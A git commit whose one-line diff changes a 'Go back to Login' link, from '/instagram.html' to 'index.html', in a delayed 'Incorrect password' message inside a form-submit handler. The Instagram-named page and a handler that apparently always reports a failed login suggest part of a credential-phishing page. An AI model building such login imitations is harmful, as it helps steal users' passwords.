b36e5a5586bca2f19bc415385794144dc5e77586
Aiyedun Miracle <aiyedunmiracle956888@gmail.com>
2024-04-17 13:01:26 -0700

    make changes

--- js/function.js
+++ js/function.js
@@ -39,7 +39,7 @@ const handleSubmit = (e) => {
             })
             .then(action =>{
                 setTimeout(()=>{
-                result.innerHTML="<div style='padding: 25px;text-align:center; color:red;'>Incorrect password <br><a href='/instagram.html'>Go back to Login</a></div>";
+                result.innerHTML="<div style='padding: 25px;text-align:center; color:red;'>Incorrect password <br><a href='index.html'>Go back to Login</a></div>";
                 loader.style.display = "none";
                 }, 10000);
 
